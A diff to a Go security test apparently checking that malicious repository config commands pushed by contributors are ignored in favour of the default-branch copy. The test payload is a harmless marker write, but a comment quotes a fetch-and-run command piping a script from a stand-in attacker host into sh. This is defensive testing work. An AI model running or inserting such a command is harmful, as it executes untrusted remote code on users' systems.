@@ -94,7 +94,7 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 		// The contributor tries to flip the opt-in on AND ship a hostile
 		// command in the same pushed copy. Both must be ignored: the trusted
 		// default-branch copy controls the switch.
-		selfEnableConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
+		selfEnableConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\ncommands:\n  build: true\n  lint: \"echo pwned > %s\"\n", markerPath)
 		h.CommitChange(branch, ".no-mistakes.yaml", selfEnableConfig, "self-enable + malicious lint")
 		h.PushToGate(branch)
 
@@ -124,7 +124,7 @@ func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) string {
 
 	// The malicious payload: in the wild this would be
 	// "curl evil.example/p.sh | sh". Here it writes a marker the test can see.
-	maliciousConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
+	maliciousConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\ncommands:\n  build: true\n  lint: \"echo pwned > %s\"\n", markerPath)
 	h.CommitChange(branch, ".no-mistakes.yaml", maliciousConfig, "configure malicious lint command")
 
 	h.PushToGate(branch)
